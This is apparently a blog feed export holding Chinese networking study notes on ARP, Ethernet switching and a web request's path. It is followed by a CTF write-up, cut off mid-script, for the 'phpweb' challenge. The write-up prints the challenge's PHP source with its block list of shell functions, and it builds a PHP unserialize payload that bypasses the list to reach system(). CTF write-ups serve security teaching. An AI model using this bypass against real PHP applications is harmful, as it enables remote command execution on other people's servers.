<li><p>A利用ARP查询R的左边网卡的IP（网关，A肯定知道）对应的MAC地址，然后将源IP、目标IP写入IP数据报，将数据报交给链路层。链路层将源MAC和目标MAC和数据报写入帧中，并将帧发送给R；</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609145733.png" /></p></li>
<li><p>R收到之后，首先比对目标MAC地址和自己是否一致，成功配对之后将数据报取出来交给上层。上层查看目标IP并对比路由表，发现是右边网卡所在的子网，因此，向右边的子网发送ARP查询，得到B的MAC地址。将IP数据报，B的MAC地址递交给链路层，链路层将R的右边网卡的MAC地址、B的MAC地址和IP数据包封装成一个新的帧，然后发送给B</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609145748.png" /></p></li>
<li><p>B收到之后，首先比较MAC地址，匹配之后将IP数据报取出，转交给网络层，网络层匹配目标IP地址，匹配成功之后，该分组就成功到达目标主机。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609145842.png" /></p></li>
</ol>
<p>下面是ARP工作的一个动图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/traditional-arp-process.gif" /></p>
<h2 id="ethernet以太网">4.3. Ethernet(以太网)</h2>
<h3 id="物理拓扑">4.3.1. 物理拓扑</h3>
<p>Ethernet的物理拓扑大致分为两种类型：</p>
<ol type="1">
<li>总线型</li>
<li>星型
<ul>
<li>hub</li>
<li>switch</li>
</ul></li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609152719.png" /></p>
<h4 id="总线">4.3.1.1. 总线</h4>
<p>介绍一下那个图中的结构，这是早期的Ethernet的拓扑</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609153241.png" /></p>
<p>每台主机可以通过网卡，然后利用某个装置刺入到同轴电缆轴，然后向同轴电缆发送信号，信号顺着同轴电缆向两边移动，遇到信号吸收装置则会把信号吸收（保证信号不反弹回去）</p>
<p>这种结构就是最早期的以太网拓扑——<strong>总线型</strong>。这种拓扑方式有一个致命的问题，那就是电缆暴露在外面，很容易被老鼠咬断，或者被其他东西磨损，使得同轴电缆的某个地方出现了截面，截面反弹信号，使得发送节点误认为是冲突（发送的信号通过截面又反射回发送节点）。并且同轴电缆一个地方损坏会导致整个网络不可用。</p>
<h4 id="集线器">4.3.1.2. 集线器</h4>
<p>因此，出现了<strong>集线器(hub)</strong>。利用集线器之后的物理拓扑为<strong>星型</strong>。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609154223.png" /></p>
<p><strong>这个集线器的作用和总线的作用一致，可以认为这些端口后面连着一根总线</strong>。如果某台主机要向其他主机发送信号，首先到达集线器，然后集线器向所有端口发送该信号。因此和总线型一样，一台主机发送信号，那么其他主机都不能够发送信号，这说明一个集线器上的所有主机属于同一个<strong>碰撞域</strong>。</p>
<blockquote>
<p>判断两台主机是否属于同一碰撞域：这两台主机是否可以同时发送信号。</p>
</blockquote>
<p>集线器解决了：</p>
<ol type="1">
<li>总线不容易磨损</li>
<li>线路坏了，那么对应的主机不能发送信号，不影响其他主机的发送。（如果集线器坏了那就整个网络GG）</li>
</ol>
<p><strong>hub本质上是物理层的中继器</strong>：</p>
<ul>
<li>从一个端口收，转发到所有其他端口</li>
<li>速率一致</li>
<li>没有帧缓存</li>
<li>在hub上没有CSMA/CD机制，由NIC检测冲突</li>
<li>提供网络管理功能（看谁不爽拔谁电线）</li>
</ul>
<p>集线器可以级联：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609182344.png" /></p>
<h4 id="交换机">4.3.1.3. 交换机</h4>
<p>集线器和总线都存在一个问题，那就是所有的主机都在一个碰撞域内。因此出现了交换机。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609154817.png" /></p>
<p>交换机的拓扑和hub的拓扑一模一样，两者的区别在于交换机的每个端口使用独立的以太网协议。简单来说每个端口都是单独的碰撞域。举个例子，最左边的发送信号给右边的主机，先将信号发送给switch，然后swtich会选择最后一个端口转发信号。此时的信号不会被广播！</p>
<p>此时可以多个主机一起发送信号：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609155144.png" /></p>
<p><strong>只有一种情况下不能够同时发送，那就是接收方是同一个主机的情况下无法同时发送</strong>。</p>
<p>交换机的出现：</p>
<ol type="1">
<li>使得每个端口都是一个单独的碰撞域</li>
<li>解决了CSMA/CD在高负载时的效率低下的问题</li>
</ol>
<p>交换机也可以级联：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609182429.png" /></p>
<p>这里会比较详细的介绍一下交换机的工作原理。</p>
<ul>
<li>交换机的任务：接收 <strong>入链路</strong>
的帧，并将这些帧转发到出链路。因为这些帧到达交换机的速度不一致，并且有可能超过接口的（接收）速率，因此，<strong>交换机的接口设有缓存</strong>。</li>
<li>交换机一般是没有MAC地址的，至少在基本功能的实现上不需要用到MAC地址。但是实际上为了方便管理，交换机会有一个MAC地址，这跟它主要功能的实现没有关系。</li>
</ul>
<h5 id="交换机的转发和过滤">4.3.1.3.1. 交换机的转发和过滤</h5>
<p>交换机具有两个功能：</p>
<ol type="1">
<li><strong>过滤</strong>：决定一个帧是否需要转发到某个接口，还是应该将其丢弃</li>
<li><strong>转发</strong>：决定一个帧应该从哪一个端口发送出去</li>
</ol>
<p>为了实现上述的两个功能，交换机需要知道每个端口上连接的主机的MAC地址。所以每个交换机都会维护一个<strong>交换机表</strong>，交换机表有三个表项：</p>
<ol type="1">
<li>MAC地址</li>
<li>通向该MAC地址的交换机接口</li>
<li>表项加入到表中的时间</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>64-EF-E7-11-43-A9</td>
<td>1</td>
<td>9:32</td>
</tr>
<tr class="even">
<td>23-AE-EF-FD-12-9F</td>
<td>3</td>
<td>9:40</td>
</tr>
<tr class="odd">
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p>为了理解交换机转发和过滤的工作过程，假定目的地址为R的帧到达交换机的接口x，交换机将R与交换机表的地址做对比，会有以下三种情况：</p>
<ol type="1">
<li>R在表中，并且对应表项的接口为y，那么交换机将该帧从y接口转发</li>
<li>R在表中，并且对应表项的接口为x，那么交换机将该帧丢弃</li>
<li>R不在表中，交换机向所有接口（除了x）广播该帧（泛洪）</li>
</ol>
<h5 id="交换机的自学习">4.3.1.3.2. 交换机的自学习</h5>
<p>交换机刚刚开始的时候交换机表是空的，那么该如何在表中填入表项呢？举个例子，上面的交换机表中，刚开始的时候为空：</p>
<ol type="1">
<li>该交换机从接口1<strong>收到</strong>一个帧，这个帧的源MAC地址为：64-EF-E7-11-43-A9，然后将其写入表项，得到：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>64-EF-E7-11-43-A9</td>
<td>1</td>
<td>9:32</td>
</tr>
</tbody>
</table>
<ol start="2" type="1">
<li>在9:40从接口3收到一个帧，这个帧的源MAC地址为：23-AE-EF-FD-12-9F，将其写入表中：</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>64-EF-E7-11-43-A9</td>
<td>1</td>
<td>9:32</td>
</tr>
<tr class="even">
<td>23-AE-EF-FD-12-9F</td>
<td>3</td>
<td>9:40</td>
</tr>
</tbody>
</table>
<p>这就是交换机的自学习过程。因此，交换机是即插即用设备(plug-and-play
device)，不需要网络管理员的干预。</p>
<p>如果交换机级联的情况下，该如何自学习呢？</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609182429.png" /></p>
<p>假设一次交互，A发送到G，G回一个响应。刚开始的时候交换机的表都为空。所有交换机的接口都是从左到右依次递增，最左边为1，上面的接口为4。</p>
<ol type="1">
<li>A发送一个帧给S1，其中目标地址为MACB</li>
<li>S1收到之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>1</td>
<td>00:00</td>
</tr>
</tbody>
</table>
<ol start="3" type="1">
<li>S4收到之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>1</td>
<td>00:00</td>
</tr>
</tbody>
</table>
<ol start="4" type="1">
<li>S3收到之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪。交换机表相同</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>4</td>
<td>00:00</td>
</tr>
</tbody>
</table>
<ol start="5" type="1">
<li>G收到该帧，验证之后回复一个响应</li>
<li>S3收到响应帧之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>4</td>
<td>00:00</td>
</tr>
<tr class="even">
<td>MACG</td>
<td>1</td>
<td>00：01</td>
</tr>
</tbody>
</table>
<ol start="7" type="1">
<li>S4收到之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>1</td>
<td>00:00</td>
</tr>
<tr class="even">
<td>MACG</td>
<td>3</td>
<td>00:01</td>
</tr>
</tbody>
</table>
<ol start="8" type="1">
<li>S1收到之后，因为交换机表中没有对应表项，故先将该信息写入交换机表，然后向其他接口泛洪</li>
</ol>
<table>
<thead>
<tr class="header">
<th>地址</th>
<th>接口</th>
<th>时间</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>MACA</td>
<td>1</td>
<td>00:00</td>
</tr>
<tr class="even">
<td>MACG</td>
<td>4</td>
<td>00:01</td>
</tr>
</tbody>
</table>
<ol start="9" type="1">
<li>A收到来自G的响应帧，进行验证，验证通过，流程结束。</li>
</ol>
<h5 id="交换机的性质">4.3.1.3.3. 交换机的性质</h5>
<p>交换机有以下3个性质：</p>
<ol type="1">
<li><strong>消除碰撞</strong>：使用交换机不会产生碰撞。交换机会缓存帧，并且绝不会在网段上同时传输多于一个的帧。因此，即使接收方是同一个，因为缓存的存在，交换机也会依次发送帧，不会造成冲突。就像路由器一样，交换机的最大聚合带宽是该交换机所有接口速率之和。
<ul>
<li>没有碰撞就意味着CSMA/CD在发送前不需要侦听信道是否空闲，交换机能够帮忙解决。没有碰撞就意味着CSMA/CD在高负载的情况下效率也很高（原来在高负载的情况下效率低就是因为碰撞多）</li>
<li>这个原因也是为什么以太网的占有率高的原因。CSMA/CD +
交换机使以太网能够在任何负载的情况下保持高效率。</li>
</ul></li>
<li><strong>异质的链路</strong>：交换机将链路彼此隔离，因此局域网种的不同链路能够以不同的速率运行并且能够在不同的媒体上运行。</li>
<li><strong>管理</strong>：如果某个NIC出现问题，不停的发送帧，交换机能够检测到该问题，并且自动切断异常适配器。交换机还能统计带宽的使用情况和流量类型，并让这些信息为网络管理员使用。</li>
</ol>
<p>交换机、路由器、集线器比较：</p>
<table>
<thead>
<tr class="header">
<th></th>
<th>集线器</th>
<th>交换机</th>
<th>路由器</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>流量隔离</td>
<td>无</td>
<td>有</td>
<td>有</td>
</tr>
<tr class="even">
<td>即插即用</td>
<td>有</td>
<td>有</td>
<td>无</td>
</tr>
<tr class="odd">
<td>优化路由</td>
<td>无</td>
<td>无</td>
<td>有</td>
</tr>
</tbody>
</table>
<p>交换机和路由器有一个最大的区别：</p>
<ul>
<li>因为网络太多，因此网络与网络的拓扑很容易变成环，但是路由器不怕，路由算法能够避免环路</li>
<li>交换机表不行，交换机如果多次级联形成环路（A的一个接口接B，B的里一个接口接C，C的一个接口接A的另一个接口），形成环路之后在进行泛洪时就会产生<strong>广播风暴（帧一直在环路中转发，并且会越来越多）</strong>。为了解决该问题，交换机会执行生成树算法，让部分端口处于转发状态，部分端口处于阻塞状态，使其在任何一刻都没有环。</li>
</ul>
<p>一个机构网络例子：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609185936.png" /></p>
<h3 id="ethernet帧结构和服务">4.3.2. Ethernet帧结构和服务</h3>
<p>以太网帧结构如下图：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609180242.png" /></p>
<p>发送方NIC在以太网帧种封装IP数据报，或其他网络层协议的数据单元。</p>
<ul>
<li>前导码：7B的 10101010 加上 1B的
10101011。用来同步发送方和接收方的时钟速率
<ul>
<li>使得接收方将自己的时钟调到发送方的时钟</li>
<li>从而可以按照发送端的时钟来接收所发送的帧</li>
</ul></li>
<li>源/目标地址：6字节的MAC地址
<ul>
<li>目标地址为本节点MAC地址或者为广播地址的时候，节点才会接收该帧，否则就丢弃</li>
</ul></li>
<li>类型：指出网络层使用的协议（一般为IP，也有可能为Novell
IPX和AppleTalk）</li>
<li>CRC：在接收方校验。之所以放在后面是因为当前面的所有内容都发送完毕之后，硬件就会自动计算出CRC，然后将其发出去。</li>
</ul>
<p><strong>Ethernet提供的是无连接、不可靠的服务。</strong></p>
<ul>
<li>无连接：帧传输前，发送方和接收方不需要握手</li>
<li>不可靠：接收方NIC不发送Ack或者NAK
<ul>
<li>递交给网络层的数据报流可能有缺失</li>
<li>可靠的服务交给上层协议</li>
</ul></li>
<li>以太网的MAC协议：<strong>采用二进制退避的CSMA/CD</strong>
（上一节谈过[[#3 2 4 CSMA CD]]）</li>
</ul>
<h3 id="ethernet标准链路和物理层">4.3.3. Ethernet标准：链路和物理层</h3>
<p>（物理层的内容）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609181019.png" /></p>
<ul>
<li>copper physical layer：同轴电缆</li>
<li>fiber physical layer：光纤</li>
</ul>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609181236.png" /></p>
<h4 id="manchester编码">4.3.3.1. Manchester编码</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609181518.png" /></p>
<ul>
<li>每一个bit的中间有一个信号跳变</li>
<li>允许在接收方和发送方节点之间进行时钟同步</li>
<li>10Mbps的数据，需要使用20M带宽，效率为50%</li>
</ul>
<p>信号的跳变有两个作用：</p>
<ol type="1">
<li>让接收方能够同步时钟</li>
<li>区分0和1。0是向上跳变，1是向下跳变</li>
</ol>
<p>这样子还有一个小问题，那就是如果信号都是0或者都是1，那么就无法同步时钟。因此，利用5b代替4b的数据</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609181850.png" /></p>
<p>要发送左边的4b，就使用右边的5b代替。5bit有32种组合，从其中选择16种“凹凸有致”的信号作为4b的代替。</p>
<h4 id="千兆以太网">4.3.3.2. 千兆以太网</h4>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609182106.png" /></p>
<h3 id="帧最小长度">4.3.4. 帧最小长度</h3>
<p>首先，需要明确什么算是发送成功：</p>
<ol type="1">
<li>帧中的最后一个bit从发送方发出</li>
<li>整个帧被接收方接收</li>
</ol>
<p>答案其实是2。</p>
<blockquote>
<p>下面出现的t其实都是 <span class="math inline">\(\tau\)</span></p>
</blockquote>
<p>早期的Ethernet有一个最长距离：2500m，沿着最长距离从一端A到另一端B的时间称为
t。如下图所示：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609213139.png" /></p>
<p>A在0时刻开始发送帧，在t-时刻，B检测信道，发现信道是空闲的，因此开始传送帧。t-和t之间的某一个时刻，发生了碰撞。这个碰撞的信号大概又经过了t时刻回到A（蓝色虚线），碰撞信号在t时刻到达B（绿色虚线）。如果t-无限接近于t，那么碰撞时间也会无限接近于t，那么A收到碰撞信号就会无限接近于2t。</p>
<p>因此，A发送帧，如果发生冲突，一定会在2t时间内收到冲突信号。换言之，如果发送帧的第一个bit开始计时的2t时间内如果没收到冲突信号，那么就不可能产生冲突了2t时刻，最远的节点都收到A的信号了，所以所有的节点肯定收到了，因此2t时刻之后不可能产生冲突。</p>
<p>但是，如果A发送的帧非常的小，假设只有1bit，那么0时刻A就发送完了，并且A根本不会感觉到冲突。但是这个帧真的能够成功被对方接收吗？不一定，可能发生上图中一样的状况。因此，<strong>不冲突不代表发送成功</strong>。</p>
<p>那么需要怎么做到 “不冲突代表成功”
呢？答案其实很简单，<strong>只要在2t之内，A没有把帧全部发送完即可</strong>，这样一来，在2t之内A会一直执行CD，如果有冲突就能够发现，如果2t之内没冲突，那么就说明不会再产生冲突了。因此，帧的最小长度应该为
<span class="math inline">\(2\tau \cdot R\)</span>
，其中R为链路的带宽。</p>
<p>对于最大长度为2500米的10Mbps网络和四个中继器（来自802.3规范），在最坏的情况下，<strong>往返时间2t</strong>（包括通过四个中继器的传播时间）被确定为接近51.2us。</p>
<p><span class="math display">\[
\begin{aligned}
2\tau \cdot R &amp; = 51.2us \cdot 10Mb/s \\
&amp; = 51.2 \times 10^{-6}s \cdot 10 \times 10^{6} \\
&amp; = 512b \\
&amp; = 64B
\end{aligned}
\]</span></p>
<p>因此，以太网中，帧的最小长度为64字节。如果发送的数据部分加上头部（不包括填充字段）没有到达这个长度，头部中的填充字段会将长度补足。</p>
<h1 id="a-day-in-the-life-of-web-request">5. a day in the life of web
request</h1>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609220335.png" /></p>
<p>假设校园中的一台主机需要访问<code>www.google.com</code>。简单分析全过程（以太网）</p>
<p>（下面的图中在封装和解封装的时候是有箭头指示的）</p>
<h2 id="dhcp">5.1. DHCP</h2>
<ol type="1">
<li>客户端发送DHCP请求，该请求封装在UDP中，然后封装到IP数据报中，最后封装到帧</li>
<li>帧到达交换机，并在LAN中被广播（目标MAC地址为
FF-FF-FF-FF-FF-FF），被运行中的DHCP服务接收</li>
<li>DHCP服务器将帧解封装，得到HDCP请求，然后生成 DHCP
Ack。通过UDP，IP，以太网层层封装通过交换机（此时交换表中已经有了对应表项）转发到客户端。DHCP
ACK中包含以下信息：
<ul>
<li>分配给客户的IP</li>
<li>第一跳路由器的IP（网关）</li>
<li>本地DNS服务器IP</li>
<li>子网掩码（由第一跳路由器的IP可以知道子网掩码）</li>
</ul></li>
<li>客户端解封装，得到IP，终于可以上网了。</li>
</ol>
<p>请求：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609221819.png" /></p>
<p>响应：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609221831.png" /></p>
<h2 id="arp">5.2. ARP</h2>
<p>客户端需要将分组发送到google服务器，首先需要将分组发送给网关路由器。通过DHCP我们知道了网关路由器的IP地址，因此，需要通过ARP获得网关路由器的MAC地址。</p>
<ol type="1">
<li>客户端广播ARP请求帧（UDP -&gt; IP -&gt; 以太网）</li>
<li>网关路由器接收到帧之后进行解封装（以太网 -&gt;
IP），确定IP地址为自己之后，发送一个帧给客户端，帧中包含了路由器的MAC地址</li>
<li>客户端得到网关路由器的IP地址</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609221900.png" /></p>
<h2 id="dns">5.3. DNS</h2>
<p>源IP、源MAC、源port（HTTP默认80）、目标IP、目标MAC中已经知道前三个，接下来还需要知道目标IP地址就可以发送了（目标MAC地址不是现在操心的）</p>
<ol type="1">
<li>将包含DNS查询的分组通过LAN交换机转发，到达网关路由器。</li>
<li>分组通过路由到达comcast
network，最终到达DNS服务器，被DNS服务器解封装，然后根据域名将对应的IP写入响应帧中回复给客户端。</li>
</ol>
<p>其中，DNS查询是由本地DNS服务器进行的，查询的过程也省略了。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609222338.png" /></p>
<h2 id="httptcp">5.4. HTTP+TCP</h2>
<p>现在已经知道了源IP、源MAC、源port（HTTP默认80）、目标IP。现在需要建立起TCP连接</p>
<ol type="1">
<li>客户端打开web服务器的TCP socket</li>
<li>TCP SYN 域间路由到web服务器</li>
<li>web服务器用 TCP SYNACK应答</li>
<li>客户端回复ACK给web服务器</li>
<li>TCP连接建立成功！</li>
</ol>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609223011.png" /></p>
<p>最后，就是发送HTTP请求通过TCP socket -&gt; TCP -&gt; IP -&gt; 以太网
封装成帧，然后通过交换机到达网关路由器，通过网关路由器路由到web服务器所在子网。通过ARP知道web服务器的MAC，写入帧中最后将帧发送到web服务器。</p>
<p>web服务器收到请求后回复一个响应帧，同样的路由到达网关路由器，然后网关路由器也通过ARP获得客户端的MAC地址，最终将响应帧交给客户端。</p>
<p>客户端一层一层解封装，将最终数据交给浏览器进程，浏览器显示出google的网页内容。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220609223048.png" /></p>
]]></content>
      <categories>
        <category>计算机基础</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>计算网络教程 自顶向下方法</tag>
        <tag>B站中科大计网</tag>
      </tags>
  </entry>
  <entry>
    <title>网鼎杯 2020 朱雀组 phpweb</title>
    <url>/2022/03/27/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%20phpweb/</url>
    <content><![CDATA[<p>BUUCTF 网址：<a
href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="题目信息">题目信息</h1>
<p>进入环境，会发现5秒后自动跳转到 index.php
页面，并且之后每5秒刷新一次，查看源码，发现应该是如下函数：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">setTimeout(&quot;document.form1.submit()&quot;,5000)</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230357.png" /></p>
<p>这不是重点，接着我们抓包</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230244.png" /></p>
<p>发现 POST 提交了两个参数 <code>func</code> 和 <code>p</code>
。结合上面的表单消息推测，<code>func</code> 应该是函数的意思，而
<code>p</code> 应该是一个参数。（上面表单中的<code>p</code>
是时间的格式，可能是参数）</p>
<h1 id="解题">解题</h1>
<p>将函数随便改一个试试看（这里 echo
并不是函数，主要想看看报错的信息）</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327230721.png" /></p>
<p>注意
<code>call_user_func()</code>，这函数的作用简而言之就是调用一个PHP函数，可以带入参数，语法如下：
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">call_user_func(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> <span class="variable">$parameter</span> = ?, <span class="keyword">mixed</span> $... = ?): <span class="keyword">mixed</span></span><br></pre></td></tr></table></figure></p>
<p>更多信息请参考：<a
href="https://www.php.net/manual/zh/function.call-user-func.php">PHP_call_user_func</a></p>
<p>因此，我们尝试用 <code>file_get_contents()</code> 读取一下
<code>index.php</code> 的内容</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220327231040.png" /></p>
<p>将代码整理如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$disable_fun</span> = <span class="keyword">array</span>(<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = call_user_func(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">	<span class="variable">$a</span>= gettype(<span class="variable">$result</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">	    <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, <span class="keyword">$this</span>-&gt;p);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">	<span class="variable">$func</span> = strtolower(<span class="variable">$func</span>);</span><br><span class="line">    <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">	    <span class="keyword">echo</span> gettime(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里<code>get time</code> 中的 <code>call_user_func()</code>
函数能够调用的函数被禁了好多，但是这不是重点，重点是 <code>Test</code>
类里面的 <code>__destruct</code> ，这个也可以调用
<code>call_user_func()</code>
而且是不经过验证。因此思路就是构造序列化字符串作为 POST 提交的
<code>p</code> ，而POST 提交的 <code>func</code> 则为
<code>unserialize</code>。</p>
<p>接下来构造 <code>p</code>
（这里的p指的是POST提交的，而不是类中的）</p>
<blockquote>
<p>这里类中的 var 其实是 public 的别名</p>
</blockquote>
<p>编写简单的PHP脚本： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;参数&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> gettime(<span class="keyword">$this</span>-&gt;func, 